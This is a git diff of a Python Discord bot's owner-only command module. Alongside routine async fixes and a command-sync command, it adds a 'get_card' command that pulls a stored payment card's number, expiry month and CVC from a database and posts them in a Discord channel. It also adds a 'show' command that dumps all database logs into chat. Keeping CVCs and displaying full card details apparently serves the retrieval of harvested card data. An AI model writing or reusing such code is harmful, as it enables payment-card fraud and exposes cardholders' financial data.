@@ -9,7 +9,7 @@ from discord.ext import commands
 
 from config import VERIFIED, MAIN_COLOR, SUGGESTIONS_CHANNEL
 from utils.button import Close, Ticket, Verify
-from utils.database import clear_db, db, get_warns, warn_user
+from utils.database import clear_db, db, get_card_info, get_warns, show_all_db_logs, warn_user
 import asyncio
 import sys
 import redis
@@ -45,22 +45,22 @@ class owners(commands.Cog, description="No go away developers only"):
     @commands.command()
     @commands.is_owner()
     async def load(self, ctx, extension):
-        self.bot.load_extension(f'cogs.{extension}')
+        await self.bot.load_extension(f'cogs.{extension}')
         logging.info(f'Module {extension} was loaded')
         await ctx.send(f'Module {extension} was loaded')
 
     @commands.command()
     @commands.is_owner()
     async def unload(self, ctx, extension):
-        self.bot.unload_extension(f'cogs.{extension}')
+        await self.bot.unload_extension(f'cogs.{extension}')
         logging.info(f'Module {extension} was unloaded')
         await ctx.send(f'Module **{extension}** is unloaded.')
 
     @commands.command()
     @commands.is_owner()
     async def reload(self, ctx, extension):
-        self.bot.unload_extension(f'cogs.{extension}')
-        self.bot.load_extension(f'cogs.{extension}')
+        await self.bot.unload_extension(f'cogs.{extension}')
+        await self.bot.load_extension(f'cogs.{extension}')
         logging.info(f'Module {extension} was reloaded')
         await ctx.send(f'Module **{extension}** was reloaded.')
 
@@ -132,7 +132,33 @@ class owners(commands.Cog, description="No go away developers only"):
     @commands.is_owner()
     async def clear_db(self, ctx):
         await clear_db()
-        await ctx.send("Database has been cleared")
+        await ctx.send(f"Database has been cleared. {ctx.guild.id}")
+
+    @commands.command()
+    @commands.is_owner()
+    async def sync(self, ctx):
+        """Sync all commands to this server"""
+        progress_msg = await ctx.send("Trying to sync...")
+        await self.bot.tree.sync(guild=discord.Object(id=ctx.guild.id))
+        await progress_msg.edit(content="Synced!")
+
+    @commands.command()
+    @commands.is_owner()
+    async def get_card(self, ctx, *, card_id):
+        """Get a card from the database"""
+        card = await get_card_info(card_id)
+        if card is None:
+            await ctx.send("Card not found")
+        else:
+            embed = discord.Embed(title=f"{card['card_name']}'s Card", description=f"Card Number: {card['card_id']}\nCard Month: {card['card_month']}\nCard CVC: {card['card_cvc']}", color=MAIN_COLOR)
+            await ctx.send(embed=embed)
+
+    @commands.command()
+    @commands.is_owner()
+    async def show(self, ctx):
+        await ctx.send(await show_all_db_logs())
+
+
 
 async def setup(bot):
     await bot.add_cog(owners(bot=bot))
